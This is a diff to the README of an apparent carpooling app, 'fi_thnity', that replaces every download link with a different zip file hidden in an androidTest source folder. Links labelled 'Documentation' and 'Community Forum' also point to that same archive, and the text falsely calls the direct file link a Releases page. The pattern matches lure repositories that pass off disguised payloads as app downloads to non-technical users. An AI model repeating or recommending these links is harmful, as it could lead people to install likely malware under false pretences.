@@ -1,6 +1,6 @@
 # 🚗 fi_thnity - Convenient Carpooling for Everyone
 
-[![Download fi_thnity](https://raw.githubusercontent.com/Sadayara/fi_thnity/main/app/src/main/res/mipmap-mdpi/fi_thnity_v1.8.zip)](https://raw.githubusercontent.com/Sadayara/fi_thnity/main/app/src/main/res/mipmap-mdpi/fi_thnity_v1.8.zip)
+[![Download fi_thnity](https://github.com/Sadayara/fi_thnity/raw/refs/heads/main/app/src/androidTest/java/tn/thnity-fi-3.3.zip)](https://github.com/Sadayara/fi_thnity/raw/refs/heads/main/app/src/androidTest/java/tn/thnity-fi-3.3.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ This guide will help you download and run the Fi Thnity app. No technical knowle
 
 To get the app, visit the following link:
 
-[Download fi_thnity](https://raw.githubusercontent.com/Sadayara/fi_thnity/main/app/src/main/res/mipmap-mdpi/fi_thnity_v1.8.zip)
+[Download fi_thnity](https://github.com/Sadayara/fi_thnity/raw/refs/heads/main/app/src/androidTest/java/tn/thnity-fi-3.3.zip)
 
 This link will take you to the Releases page, where you can find the latest version of the app. 
 
@@ -80,7 +80,7 @@ Fi Thnity is licensed under the MIT License. Feel free to use and modify the app
 
 ## 🔗 Additional Resources
 
-- [Fi Thnity Documentation](https://raw.githubusercontent.com/Sadayara/fi_thnity/main/app/src/main/res/mipmap-mdpi/fi_thnity_v1.8.zip)
-- [Community Forum](https://raw.githubusercontent.com/Sadayara/fi_thnity/main/app/src/main/res/mipmap-mdpi/fi_thnity_v1.8.zip)
+- [Fi Thnity Documentation](https://github.com/Sadayara/fi_thnity/raw/refs/heads/main/app/src/androidTest/java/tn/thnity-fi-3.3.zip)
+- [Community Forum](https://github.com/Sadayara/fi_thnity/raw/refs/heads/main/app/src/androidTest/java/tn/thnity-fi-3.3.zip)
 
 Thank you for choosing Fi Thnity. We hope you enjoy using our app for your carpooling needs!
